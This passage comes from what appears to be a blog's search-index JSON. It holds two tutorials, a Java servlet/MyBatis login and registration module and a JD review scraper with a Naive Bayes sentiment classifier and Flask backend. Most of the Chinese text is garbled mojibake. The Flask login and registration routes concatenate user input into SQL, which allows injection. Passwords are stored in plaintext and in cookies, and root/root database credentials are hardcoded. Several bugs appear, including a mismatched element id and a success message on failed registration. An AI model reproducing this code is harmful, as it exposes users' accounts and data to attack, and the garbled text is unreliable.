&#x27;http://localhost:8080/brand-case/brand/update&#x27;, data: _this.updateBrand &#125;).then(function(response)&#123; if(response.data == &quot;success&quot;)&#123; _this.dialogUpdateVisible = false; _this.selectAll(); _this.msgbox(&quot;ä¿®æ”¹æˆåŠŸï¼&quot;); &#125; &#125;) &#125;, ç™»å½•æ³¨å†ŒåŠŸèƒ½å®ç°ç™»å½•åŠŸèƒ½åç«¯å®ç°daoåœ¨src/main/java/com/itheima/mapperåˆ›å»ºUserMapperæ¥å£ package com.itheima.mapper; import com.itheima.pojo.User; import org.apache.ibatis.annotations.Insert; import org.apache.ibatis.annotations.Param; import org.apache.ibatis.annotations.Select; public interface UserMapper &#123; /** * ç”¨æˆ·ç™»å½• * æ£€æŸ¥ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦æ­£ç¡® * @param username * @param password * @return */ @Select(&quot;select * from tb_user where username = #&#123;username&#125; and password = #&#123;password&#125;&quot;) User select(@Param(&quot;username&quot;) String username, @Param(&quot;password&quot;) String password); &#125; serviceåœ¨src/main/java/com/itheima/serviceä¸­åˆ›å»ºUserServiceç±» SqlSessionFactory sqlSessionFactory = SqlSessionFactoryUtils.getSqlSessionFactory(); /** * ç”¨æˆ·ç™»å½•æ–¹æ³• * @param username * @param password * @return */ public User Login(String username, String password)&#123; SqlSession session = sqlSessionFactory.openSession(); UserMapper mapper = session.getMapper(UserMapper.class); User user = mapper.select(username, password); if(user != null)&#123; return user; &#125;else &#123; return null; &#125; &#125; servletåœ¨src/main/java/com/itheima/servler/webä¸­åˆ›å»ºLoginServlet package com.itheima.web.servlet; import com.itheima.pojo.User; import com.itheima.service.UserService; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.*; import java.io.IOException; @WebServlet(value = &quot;/login&quot;) public class LoginServlet extends HttpServlet &#123; // å› ä¸ºBrandServiceå¯èƒ½å¤šæ¬¡ç”¨åˆ° æ‰€ä»¥å˜æˆæˆå‘˜å˜é‡ å‡å°‘åˆ›å»ºçš„æ¬¡æ•° UserService userservice = new UserService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; System.out.println(&quot;login&quot;); //è§£å†³POSTè¯·æ±‚ä¸­æ–‡ä¹±ç é—®é¢˜ request.setCharacterEncoding(&quot;UTF-8&quot;); String username = request.getParameter(&quot;username&quot;); String password = request.getParameter(&quot;password&quot;); User user = userservice.Login(username, password); if(user != null)&#123; // ç™»å½•æˆåŠŸï¼Œé¡µé¢è·³è½¬åˆ°äº† brand.jsp // ä¿å­˜ç”¨æˆ·çš„sessionä¿¡æ¯ // æ£€æŸ¥æ˜¯å¦å‹¾é€‰è®°ä½å¯†ç  String remember = request.getParameter(&quot;remember&quot;); if(&quot;1&quot;.equals(remember))&#123; Cookie c_username = new Cookie(&quot;username&quot;, username); Cookie c_password = new Cookie(&quot;password&quot;, password); c_username.setMaxAge(3600*24*7); c_password.setMaxAge(3600*24*7); // å‘é€Cookie response.addCookie(c_username); response.addCookie(c_password); &#125; HttpSession session = request.getSession(); session.setAttribute(&quot;user&quot;, user); // è·å–é¡¹ç›®çš„è™šæ‹Ÿè·¯å¾„ String contextPath = request.getContextPath(); request.getRequestDispatcher( &quot;/brand.html&quot;).forward(request,response); &#125;else &#123; // ç™»å½•å¤±è´¥ï¼Œåœ¨é¡µé¢æ˜¾ç¤ºç™»å½•å¤±è´¥çš„æç¤ºä¿¡æ¯ request.setAttribute(&quot;login_msg&quot;,&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;); request.getRequestDispatcher(&quot;/login.jsp&quot;).forward(request,response); &#125; &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; å‰ç«¯å®ç°&lt;div id=&quot;loginDiv&quot; style=&quot;height: 350px&quot;&gt; &lt;form action=&quot;/brand-case/login&quot; method=&quot;post&quot;id=&quot;form&quot;&gt; &lt;h1 id=&quot;loginMsg&quot;&gt;LOGIN IN&lt;/h1&gt; &lt;div id=&quot;errorMsg&quot;&gt;$&#123;login_msg&#125; $&#123;register_msg&#125;&lt;/div&gt; &lt;p&gt;Username:&lt;input id=&quot;username&quot; name=&quot;username&quot; value=&quot;$&#123;cookie.username.value&#125;&quot; type=&quot;text&quot;&gt;&lt;/p&gt; &lt;p&gt;Password:&lt;input id=&quot;password&quot; name=&quot;password&quot; value=&quot;$&#123;cookie.password.value&#125;&quot;type=&quot;password&quot;&gt;&lt;/p&gt; &lt;p&gt;Remember:&lt;input id=&quot;remember&quot; name=&quot;remember&quot; value=&quot;1&quot; type=&quot;checkbox&quot;&gt;&lt;/p&gt; &lt;div id=&quot;subDiv&quot;&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;login up&quot;&gt; &lt;input type=&quot;reset&quot; class=&quot;button&quot; value=&quot;reset&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;a href=&quot;register.jsp&quot;&gt;æ²¡æœ‰è´¦å·ï¼Ÿ&lt;/a&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; æ³¨å†ŒåŠŸèƒ½åç«¯å®ç°dao/** * æŸ¥è¯¢æ˜¯å¦å­˜åœ¨ç›¸åŒçš„ç”¨æˆ·å * @param username * @return */ @Select(&quot;select * from tb_user where username = #&#123;username&#125;&quot;) User selectUser(@Param(&quot;username&quot;) String username); /** * ç”¨æˆ·æ³¨å†Œ * @param user */ @Insert(&quot;insert into tb_user values (null, #&#123;username&#125;, #&#123;password&#125;)&quot;) void addUser(User user); service/** * æ³¨å†ŒåŠŸèƒ½ * @param user * @return */ public boolean Register(User user)&#123; SqlSession session = sqlSessionFactory.openSession(); UserMapper mapper = session.getMapper(UserMapper.class); User u = mapper.selectUser(user.getUsername()); if(u == null)&#123; mapper.addUser(user); session.commit(); &#125; session.commit(); return u == null; &#125; servletpackage com.itheima.web.servlet; import com.itheima.pojo.User; import com.itheima.service.UserService; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebServlet(value = &quot;/register&quot;) public class RegisterServlet extends HttpServlet &#123; // å› ä¸ºUserServiceå¯èƒ½å¤šæ¬¡ç”¨åˆ° æ‰€ä»¥å˜æˆæˆå‘˜å˜é‡ å‡å°‘åˆ›å»ºçš„æ¬¡æ•° UserService userservice = new UserService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; //è§£å†³POSTè¯·æ±‚ä¸­æ–‡ä¹±ç é—®é¢˜ request.setCharacterEncoding(&quot;UTF-8&quot;); String username = request.getParameter(&quot;username&quot;); String password = request.getParameter(&quot;password&quot;); String checkCode1 = request.getParameter(&quot;checkCode&quot;); User user = new User(); user.setUsername(username); user.setPassword(password); // è·å–ç”Ÿæˆçš„éªŒè¯ç ä¿¡æ¯ HttpSession session = request.getSession(); String checkCode =(String) session.getAttribute(&quot;checkCode&quot;); // æ¯”è¾ƒç”¨æˆ·è¾“å…¥çš„éªŒè¯ç  // ç»†èŠ‚ï¼šcheckCodeä¸ºç¨‹åºä¸­å®šä¹‰çš„å˜é‡ æ¯”è¾ƒæ—¶æ”¾åœ¨å‰é¢ï¼Œå¦åˆ™å¯èƒ½å‡ºç°ç©ºæŒ‡é’ˆé”™è¯¯ if(!checkCode.equals(checkCode1))&#123; request.setAttribute(&quot;register_msg&quot;, &quot;éªŒè¯ç é”™è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ï¼&quot;); request.getRequestDispatcher(&quot;/register.jsp&quot;).forward(request,response); // ç¦æ­¢æ³¨å†Œ return ; &#125; boolean flag = userservice.Register(user); if(flag)&#123; request.setAttribute(&quot;register_msg&quot;,&quot;æ³¨å†ŒæˆåŠŸï¼Œè¯·ç™»å½•ï¼&quot;); request.getRequestDispatcher(&quot;/login.jsp&quot;).forward(request,response); &#125;else&#123; request.setAttribute(&quot;register_msg&quot;,&quot;æ³¨å†ŒæˆåŠŸï¼Œè¯·é‡è¯•ï¼&quot;); request.getRequestDispatcher(&quot;/regsiter.jsp&quot;).forward(request,response); &#125; &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; å‰ç«¯å®ç°&lt;div class=&quot;form-div&quot;&gt; &lt;div class=&quot;reg-content&quot;&gt; &lt;h1&gt;æ¬¢è¿æ³¨å†Œ&lt;/h1&gt; &lt;span&gt;å·²æœ‰å¸å·ï¼Ÿ&lt;/span&gt; &lt;a href=&quot;login.jsp&quot;&gt;ç™»å½•&lt;/a&gt; &lt;/div&gt; &lt;form id=&quot;reg-form&quot; action=&quot;/register&quot; method=&quot;post&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;td&gt;ç”¨æˆ·å&lt;/td&gt; &lt;td class=&quot;inputs&quot;&gt; &lt;input name=&quot;username&quot; type=&quot;text&quot; id=&quot;username&quot;&gt; &lt;br&gt; &lt;span id=&quot;username_err&quot; class=&quot;err_msg&quot;&gt;$&#123;register_msg&#125;&lt;/span&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;å¯†ç &lt;/td&gt; &lt;td class=&quot;inputs&quot;&gt; &lt;input name=&quot;password&quot; type=&quot;password&quot; id=&quot;password&quot;&gt; &lt;br&gt; &lt;span id=&quot;password_err&quot; class=&quot;err_msg&quot; style=&quot;display: none&quot;&gt;å¯†ç æ ¼å¼æœ‰è¯¯&lt;/span&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;éªŒè¯ç &lt;/td&gt; &lt;td class=&quot;inputs&quot;&gt; &lt;input name=&quot;checkCode&quot; type=&quot;text&quot; id=&quot;checkCode&quot;&gt; &lt;img id=&quot;checkCodeImg&quot; src=&quot;/checkCode&quot;&gt; &lt;a href=&quot;#&quot; id=&quot;changeImg&quot;&gt;çœ‹ä¸æ¸…ï¼Ÿ&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div class=&quot;buttons&quot;&gt; &lt;input value=&quot;æ³¨ å†Œ&quot; type=&quot;submit&quot; id=&quot;reg_btn&quot;&gt; &lt;/div&gt; &lt;br class=&quot;clear&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; document.getElementById(&quot;changeImgg&quot;).onclick = function() &#123; //è·¯å¾„åé¢æ·»åŠ æ—¶é—´æˆ³çš„ç›®çš„æ˜¯é¿å…æµè§ˆå™¨è¿›è¡Œç¼“å­˜é™æ€èµ„æº document.getElementById(&quot;checkCodeImg&quot;).src = &quot;/checkCode?&quot;+new Date().getMilliseconds(); &#125; &lt;/script&gt; éªŒè¯ç æ¨¡å—å€ŸåŠ©éªŒè¯ç ç”Ÿæˆå·¥å…· åœ¨src/main/java/com/itheima/utilå¼•å…¥ç”ŸæˆéªŒè¯ç çš„ç±» å°†éªŒè¯ç æ˜¾ç¤ºåœ¨é¡µé¢ä¸Š åœ¨src/main/java/com/itheima/servler/webåˆ›å»ºCheckCodeServlet package com.itheima.web.servlet; import com.itheima.service.BrandService; import com.itheima.util.CheckCodeUtil; import javax.servlet.ServletException; import javax.servlet.ServletOutputStream; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; @WebServlet(value = &quot;/checkCode&quot;) public class CheckCodeServlet extends HttpServlet &#123; // å› ä¸ºBrandServiceå¯èƒ½å¤šæ¬¡ç”¨åˆ° æ‰€ä»¥å˜æˆæˆå‘˜å˜é‡ å‡å°‘åˆ›å»ºçš„æ¬¡æ•° private BrandService brandService = new BrandService(); @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; // ç”ŸæˆéªŒè¯ç  // è·å–å“åº”è¾“å‡ºæµ ServletOutputStream os = response.getOutputStream(); // ç”ŸæˆéªŒè¯ç å›¾ç‰‡æ˜¾ç¤ºåœ¨jspé¡µé¢ä¸Š String checkCode = CheckCodeUtil.outputVerifyImage(100, 50, os, 4); // å°†ç”Ÿæˆçš„éªŒè¯ç ä¿¡æ¯å‘é€åˆ° /register ç”¨äºéªŒè¯ç”¨æˆ·è¾“å…¥çš„éªŒè¯ç æ˜¯å¦æ­£ç¡® // å°†éªŒè¯ç å­˜å…¥session HttpSession codeSession = request.getSession(); codeSession.setAttribute(&quot;checkCode&quot;, checkCode); &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; doGet(request, response); &#125; &#125; æƒé™éªŒè¯ä½¿ç”¨javawebçš„ä¸‰å¤§ç»„ä»¶ filerå®ç° åœ¨src/main/java/com/itheima/servler/web/filterä¸­åˆ›å»ºLoginFilter package com.sunzy.web.filter; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpSession; import java.io.IOException; //@WebFilter(&quot;/*&quot;) public class LoginFilter implements Filter &#123; public void init(FilterConfig config) throws ServletException &#123; &#125; public void destroy() &#123; &#125; @Override public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException &#123; // æ”¾è¡Œç™»å½•ç›¸å…³çš„èµ„æº String urls[] = &#123;&quot;/login.jsp&quot;, &quot;/css/&quot;, &quot;/imgs/&quot;, &quot;register.jsp&quot;,&quot;/checkCode&quot;,&quot;/register&quot;,&quot;/login&quot;&#125;; HttpServletRequest req = (HttpServletRequest) request; StringBuffer requestURL = req.getRequestURL(); String url = requestURL.toString(); for(String u :urls )&#123; if(url.contains(u))&#123; chain.doFilter(request,response); return ; &#125; &#125; HttpSession session = req.getSession(); Object user = session.getAttribute(&quot;user&quot;); if(user != null)&#123; chain.doFilter(request, response); &#125;else &#123; request.setAttribute(&quot;login_msg&quot;, &quot;æ‚¨å°šæœªç™»å½•ï¼&quot;); request.getRequestDispatcher(&quot;/login.jsp&quot;).forward(req, response); &#125; &#125; &#125;","tags":[{"name":"mybatis","slug":"mybatis","permalink":"https://sunzhengyu99.github.io/tags/mybatis/"},{"name":"servlet","slug":"servlet","permalink":"https://sunzhengyu99.github.io/tags/servlet/"}]},{"title":"å•†å“è¯„ä»·æƒ…æ„Ÿåˆ†æ","date":"2021-08-06T07:26:13.000Z","path":"2021/08/06/maliciousUrls/","text":"é¡¹ç›®ç»¼è¿° å¯¹ç»™å®šçš„æ–‡æœ¬è¿›è¡Œè‡ªåŠ¨åˆ†ç±»ï¼Œå¯¹è¯„ä»·åˆ†æˆå¥½è¯„å’Œå·®è¯„ æ”¯æŒæ‰¹é‡æ£€æµ‹ï¼Œå¹¶è¿›è¡Œå¯è§†åŒ–å±•ç¤º å¯¹æ‰€æœ‰è¯„ä»·è¿›è¡Œè¯äº‘å±•ç¤º æ•°æ®è·å–çˆ¬è™«è·å–JDçš„å•†å“è¯„ä»·ï¼Œè¿™é‡Œä¸»è¦é’ˆå¯¹æ™ºèƒ½æ‰‹æœºçš„è¯„ä»· é¦–å…ˆæ˜¯åˆ†æå¦‚ä½•è·å–åˆ°å•†å“çš„è¯„ä»· å¯¹å•†å“è¯„ä»·è¿›è¡Œæå– å¯¹è·å–çš„æ•°æ®è¿›è¡Œåˆ†ç±»ä¿å­˜ è·å–è¯„ä»·é¦–å…ˆè¿›è¡Œæœç´¢ï¼Œæ¯”å¦‚å…³é”®è¯ ä¸ºæ‰‹æœº self.startUrl = &quot;https://search.jd.com/Search?keyword=%s&amp;enc=utf-8&quot; % (quote(&#x27;æ‰‹æœº&#x27;)) # jDèµ·å§‹æœç´¢é¡µé¢ ä¹‹åè·å–å•†å“çš„IDï¼Œå¯ä»¥åœ¨ç½‘é¡µæºç ä¸­æå–//li[@class=&quot;gl-item&quot;]/@data-skuï¼Œå…·ä½“çš„èŠ‚ç‚¹ä¿¡æ¯å¦‚ä¸‹ è·å¾—å•†å“IDåå¯ä»¥åˆ©ç”¨JDæä¾›çš„è¯„ä»·APIè·å–è¯„è®ºé¡µé¢ï¼Œå¦‚å›¾ apiæ¥å£å¦‚ä¸‹ https://sclub.jd.com/comment/productPageComments.action?productId=100020210392&amp;score=3&amp;sortType=5&amp;page=2&amp;pageSize=10&amp;isShadowSku=0&amp;rid=0&amp;fold=1 å…¶ä¸­éœ€è¦æ”¹å˜çš„å‚æ•°ä¸º productId å•†å“ID score è¯„è®ºçš„åˆ†ç±» 1ä¸ºå·®è¯„ 2ä¸ºä¸­è¯„ 3ä¸ºå¥½è¯„ page è¯„è®ºçš„é¡µæ•° è·å–è¿™ä¸ªé¡µé¢åå°±æ˜¯å¯¹æ•°æ®è¿›è¡Œæå– æ•°æ®æå– è¿™é‡Œä¸ºäº†æ–¹ä¾¿ï¼Œå…ˆå°†æå–åˆ°çš„æ•°æ®ä¿å­˜åœ¨csvæ–‡ä»¶ä¸­ï¼Œä¹‹åå†å†™å…¥åˆ°æ•°æ®åº“ä¸­ ä¸Šå›¾ä¸­æˆ‘ä»¬éœ€è¦æå–çš„æ•°æ®åªæœ‰è¯„ä»·éƒ¨åˆ†çš„å†…å®¹å’Œæ‰“åˆ†æ•°ï¼Œä¹Ÿå°±æ˜¯ï¼Œcontentå’Œsocoreçš„æ•°æ® è¿™é‡Œå¯ä»¥å°†ç½‘é¡µæ•°æ®è½¬æ¢æˆjsonæ•°æ®åæå–ï¼Œå¾ˆæ–¹ä¾¿ res_json = json.loads(response.text) for cdit in res_json[&#x27;comments&#x27;]: # comment = cdit[&#x27;content &#x27;].replace(&quot;\\n&quot;, &#x27; &#x27;) comment = cdit[&#x27;content&#x27;].replace(&quot;\\n&quot;, &#x27; &#x27;).replace(&#x27;\\r&#x27;, &#x27; &#x27;) comments.append(comment) scores.append(cdit[&#x27;score&#x27;]) print(comment) æ•°æ®ä¿å­˜savepath = &#x27;./&#x27; + self.categlory + &#x27;_&#x27; + self.comtype[score] + &#x27;.csv&#x27; logging.warning(&quot;å·²çˆ¬å–%d æ¡ %s è¯„ä»·ä¿¡æ¯&quot; % (len(comments), self.comtype[score])) with open(savepath, &#x27;a+&#x27;, encoding=&#x27;utf8&#x27;) as f: for i in range(len(comments)): f.write(&quot;%d\\t%s\\t%s\\n&quot; % (i, scores[i], comments[i])) logging.warning(&quot;æ•°æ®å·²ä¿å­˜åœ¨ %s&quot; % (savepath)) è´å¶æ–¯åˆ†ç±» 1.åŠ è½½è¯­æ–™ï¼Œæ‰“ä¹±è¯­æ–™é¡ºåºï¼Œå°†è¯­æ–™åˆ†ä¸ºè¯„è®ºå’Œå¥½è¯„/å·®è¯„2.å»é™¤è¯„è®ºä¸­çš„è‹±æ–‡ã€åœç”¨è¯3.å°†å…¨éƒ¨è¯­æ–™æŒ‰1:4åˆ†ä¸ºæµ‹è¯•é›†ä¸è®­ç»ƒé›†4.ä½¿ç”¨CountVectorizeæ„é€ è¯è¢‹æ¨¡å‹5.ä½¿ç”¨TfidfTransformerè®¡ç®—tf-idfå€¼ä½œä¸ºç‰¹å¾ 6.é€‰æ‹©å¤šä¸ªåˆ†ç±»å™¨è¿›è¡Œåˆ†ç±»(ä¹Ÿå¯ä»¥åªç”¨ä¸€ä¸ªï¼Œè¿™é‡Œåªç”¨äº†å¤šé¡¹å¼)7.é€‰æ‹©åˆé€‚çš„æ¨¡å‹å¹¶ä¿å­˜ åŠ è½½è¯­æ–™def load_corpus(file_path_pos,file_path_nag): with open(file_path_pos, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) rows = [row for row in reader] with open(file_path_nag, &#x27;r&#x27;,encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) rows_2 = [row for row in reader] rows.extend(rows_2) # å°†è¯»å–å‡ºæ¥çš„è¯­æ–™è½¬ä¸ºlist review_data = np.array(rows).tolist() # æ‰“ä¹±è¯­æ–™çš„é¡ºåº random.shuffle(review_data) review_list = [] sentiment_list = [] # ç¬¬ä¸€åˆ—ä¸ºå·®è¯„/å¥½è¯„ï¼Œ ç¬¬äºŒåˆ—ä¸ºè¯„è®º for words in review_data: review_list.append(words[0].split(&quot;\\t&quot;)[2]) if(words[0].split(&quot;\\t&quot;)[1][0] == &#x27;5&#x27;): sentiment_list.append(1) else: sentiment_list.append(0) return review_list, sentiment_list ç”Ÿæˆçš„æ•°æ®å¦‚ä¸‹ å»é™¤è¯„è®ºä¸­çš„è‹±æ–‡ã€åœç”¨è¯è¿™ä¸€æ­¥çš„ç›®çš„æ˜¯æ–¹ä¾¿åé¢çš„è¯é¢‘ç»Ÿè®¡ def load_stopwords(file_path): # åŠ è½½åœé¡¿è¯ stop_words = [] with open(file_path, encoding=&#x27;UTF-8&#x27;) as words: stop_words.extend([i.strip() for i in words.readlines()]) return stop_words def review_to_text(review): stop_words = load_stopwords(stopword_path) # å»é™¤è‹±æ–‡ review = re.sub(&quot;[^\\u4e00-\\u9fa5^a-z^A-Z]&quot;, &#x27;&#x27;, review) # print(review) review = jieba.cut(review) # å»æ‰åœç”¨è¯ï¼Œå°†å¥å­åˆ’åˆ†æˆä¸€ä¸ªä¸ªçš„å•è¯ ä¾‹å¦‚ï¼š[&#x27;èµèµèµ&#x27;, &#x27;ä¸é”™&#x27;, &#x27;å¾ˆæ¼‚äº®&#x27;, &#x27;å¤–å£³&#x27;] words = [] if stop_words: all_stop_words = set(stop_words) words = [w for w in review if w not in all_stop_words] print(words[:4]) return words æœ€åç»è¿‡å¤„ç† review_train = [&#x27; &#x27;.join(review_to_text(review)) for review in train_review_list] review_test = [&#x27; &#x27;.join(review_to_text(review)) for review in test_review_list] å‘ˆç°å¦‚ä¸‹çš„æ•ˆæœ è®­ç»ƒæ¨¡å‹# åŠ è½½è¯­æ–™ review_list, sentiment_list = load_corpus(file_path_pos,file_path_nag) # å°†å…¨éƒ¨è¯­æ–™æŒ‰1:4åˆ†ä¸ºæµ‹è¯•é›†ä¸è®­ç»ƒé›† n = len(review_list) // 5 train_review_list, train_sentiment_list = review_list[n:], sentiment_list[n:] test_review_list, test_sentiment_list = review_list[:n], sentiment_list[:n] print(&#x27;è®­ç»ƒé›†æ•°é‡ï¼š &#123;&#125;&#x27;.format(str(len(train_review_list)))) print(&#x27;æµ‹è¯•é›†æ•°é‡ï¼š &#123;&#125;&#x27;.format(str(len(test_review_list)))) # ç”¨äºè®­ç»ƒçš„è¯„è®º review_train = [&#x27; &#x27;.join(review_to_text(review)) for review in train_review_list] # å°†å¥å­ä¸­çš„å•è¯é‡æ–°æ‹¼æ¥ï¼Œå½¢æˆæ— åœé¡¿è¯çš„å¥å­ # å¯¹äºè®­ç»ƒè¯„è®ºå¯¹åº”çš„å¥½è¯„/å·®è¯„ sentiment_train = train_sentiment_list # ç”¨äºæµ‹è¯•çš„è¯„è®º review_test = [&#x27; &#x27;.join(review_to_text(review)) for review in test_review_list] print(review_test[:3]) # å¯¹äºæµ‹è¯•è¯„è®ºå¯¹åº”çš„å¥½è¯„/å·®è¯„ sentiment_test = test_sentiment_list vectorizer = CountVectorizer(max_df=0.8, min_df=3) tfidftransformer = TfidfTransformer() # å…ˆè½¬æ¢æˆè¯é¢‘çŸ©é˜µï¼Œå†è®¡ç®—TFIDFå€¼ tfidf = tfidftransformer.fit_transform(vectorizer.fit_transform(review_train)) # æœ´ç´ è´å¶æ–¯ä¸­çš„å¤šé¡¹å¼åˆ†ç±»å™¨ï¼Œè®­ç»ƒæ¨¡å‹ clf = MultinomialNB().fit(tfidf, sentiment_train) # å°†æ¨¡å‹ä¿å­˜pickleæ–‡ä»¶ with open(model_export_path, &#x27;wb&#x27;) as file: d = &#123; &quot;clf&quot;: clf, &quot;vectorizer&quot;: vectorizer, &quot;tfidftransformer&quot;: tfidftransformer, &#125; pickle.dump(d, file) print(&quot;è®­ç»ƒå®Œæˆ&quot;) ä½¿ç”¨æµ‹è¯•æ•°æ®é›†éªŒè¯è¯¥æ¨¡å‹çš„å‡†ç¡®æ€§ count_vec = CountVectorizer(max_df=0.8, min_df=3) tfidf_vec = TfidfTransformer() # å®šä¹‰Pipelineå¯¹å…¨éƒ¨æ­¥éª¤çš„æµå¼åŒ–å°è£…å’Œç®¡ç†ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä½¿å‚æ•°é›†åœ¨æ–°æ•°æ®é›†ï¼ˆæ¯”å¦‚æµ‹è¯•é›†ï¼‰ä¸Šè¢«é‡å¤ä½¿ç”¨ã€‚ def MNB_Classifier(): return Pipeline([ (&#x27;count_vec&#x27;, count_vec), (&#x27;tfidf_vec&#x27;, tfidf_vec), (&#x27;mnb&#x27;, MultinomialNB()) ]) mnbc_clf = MNB_Classifier() # è¿›è¡Œè®­ç»ƒ mnbc_clf.fit(review_train, sentiment_train) # æµ‹è¯•é›†å‡†ç¡®ç‡ print(&#x27;æµ‹è¯•é›†å‡†ç¡®ç‡ï¼š &#123;&#125;&#x27;.format(mnbc_clf.score(review_test, sentiment_test))) å‡†ç¡®æ€§å¯ä»¥è¾¾åˆ°88%ï¼Œæ˜¯ä¸€ä¸ªä¸é”™çš„ç»“æœ å¯è§†åŒ–ç½‘é¡µæ•°æ®åº“å°†çˆ¬å–çš„è¯„è®ºå†™å…¥æ•°æ®åº“ï¼Œå°†ç½‘é¡µä¸­è¾“å…¥çš„æ£€æµ‹æ•°æ®å’Œç»“æœå†™å…¥æ•°æ®åº“ï¼Œä»¥åŠç”¨æˆ·ç™»å½•è´¦å·å¯†ç  æ‰€ä»¥éœ€è¦ä¸‰ä¸ªæ•°æ®è¡¨ä¿å­˜ä¸Šé¢æåˆ°çš„ä¸‰ç§æ•°æ® è¿™é‡Œä½¿ç”¨è„šæœ¬ä¸€é”®å®Œæˆ # -*- coding = utf - 8 -*- #@Time : 2021/8/6 22:35 #@Author : sunzy #@File : db_helper.py import re import csv import random import pymysql conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) def createTable(): sql = &quot;create table comment(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot; cur = conn.cursor() cur.execute(sql) cur.close() def createTable1(): sql = &quot;create table user(id int primary key auto_increment,username varchar(80),password varchar(200))&quot; cur = conn.cursor() cur.execute(sql) cur.close() def createTable2(): sql = &quot;create table result(id int primary key auto_increment,comment varchar(800) CHARACTER SET &#x27;utf8&#x27;,type varchar(200) CHARACTER SET &#x27;utf8&#x27;)&quot; cur = conn.cursor() cur.execute(sql) cur.close() createTable() createTable1() createTable2() with open(&#x27;æ‰‹æœº_nagetive.csv&#x27;, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) for row in reader: r = &#x27;&#x27;.join(row) cursor = conn.cursor() cursor.execute(&quot;insert into `comment` values(null, %s, &#x27;å·®è¯„&#x27;)&quot;, (r.split()[2])); conn.commit() cursor.close() with open(&#x27;æ‰‹æœº_positive.csv&#x27;, &#x27;r&#x27;, encoding=&#x27;UTF-8&#x27;) as f: reader = csv.reader(f) for row in reader: r = &#x27;&#x27;.join(row) cursor = conn.cursor() cursor.execute(&quot;insert into `comment` values(null, %s, &#x27;å¥½è¯„&#x27;)&quot;, (r.split()[2])); conn.commit() cursor.close() ç”¨æˆ·æ³¨å†Œå’Œç™»å½•ç”¨æˆ·çš„æ³¨å†Œå’Œç™»å½•é€»è¾‘å¾ˆç®€å•ï¼Œå°±æ˜¯ä¸æ•°æ®åº“è¿›è¡Œäº¤äº’ @app.route(&#x27;/addUser&#x27;,methods=[&#x27;POST&#x27;]) def addUser(): get_json = request.get_json() name = get_json[&#x27;name&#x27;] password = get_json[&#x27;password&#x27;] conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) cursor = conn.cursor() sql = &quot;insert into `user` values(null,&#x27;&quot;+name+&quot;&#x27;,&#x27;&quot;+password+&quot;&#x27;,&#x27;user&#x27;)&quot; cursor.execute(sql); conn.commit() table_result = &#123;&quot;code&quot;: 200, &quot;msg&quot;: &quot;æˆåŠŸ&quot;&#125; cursor.close() conn.close() return jsonify(table_result) @app.route(&#x27;/loginByPassword&#x27;,methods=[&#x27;POST&#x27;]) def loginByPassword(): get_json = request.get_json() name = get_json[&#x27;name&#x27;] password = get_json[&#x27;password&#x27;] conn = pymysql.connect(host=&#x27;127.0.0.1&#x27;, user=&#x27;root&#x27;, password=&#x27;root&#x27;, port=3306, db=&#x27;goods&#x27;, charset=&#x27;utf8mb4&#x27;) cursor = conn.cursor() cursor.execute(&quot;select count(*) from `user` where `username` = &#x27;&quot; + name +&quot;&#x27; and password = &#x27;&quot; + password+&quot;&#x27;&quot;); count = cursor.fetchall() if(count[0][0] != 0): table_result = &#123;&quot;code&quot;: 200, &quot;msg&quot;: name&#125; else: table_result = &#123;&quot;code&quot;: 500, &quot;msg&quot;: &quot;å¤±è´¥&quot;&#125; cursor.close() conn.close() return jsonify(table_result) ç”¨æˆ·æˆåŠŸç™»å½•åï¼Œjsè„šæœ¬ä¼šé‡å®šå‘åˆ°index.htmlé¡µé¢ï¼Œè¿›å…¥ç³»ç»Ÿä¸»é¡µ form.on(&#x27;submit(login-submit)&#x27;, function (obj) &#123; $.ajax(&#123; type: &quot;post&quot;, contentType: &#x27;application/json&#x27;, url: 